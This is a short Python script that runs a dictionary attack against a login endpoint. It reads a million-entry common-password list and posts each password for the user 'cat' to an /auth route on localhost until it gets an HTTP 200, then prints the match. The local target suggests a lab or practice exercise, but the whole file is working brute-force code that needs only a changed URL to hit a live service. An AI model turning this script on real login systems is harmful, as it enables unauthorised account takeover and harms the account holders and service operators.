import requests

with open('../10-million-password-list-top-1000000.txt') as f:
    content = f.read()
    password_list = content.split('\n')

for password in password_list:
    response = requests.post('http://127.0.0.1:5000/auth',
                             json={'login': 'cat', 'password': password})
    if response.status_code == 200:
        print('SUCCESS, password', password)
        break
